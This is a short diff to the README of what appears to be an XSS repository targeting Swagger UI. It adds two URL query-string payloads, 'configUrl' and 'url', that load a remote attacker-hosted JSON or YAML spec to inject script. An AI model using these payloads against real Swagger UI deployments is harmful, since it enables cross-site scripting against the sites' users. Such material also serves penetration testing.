@@ -1,2 +1,4 @@
 # XSS-Swagger-UI
-XSS For Swagger UI 2.0
+XSS For API Swagger UI 
+?configUrl=https://<domain>/xss.json
+?url=https://<domain>/xss.yaml
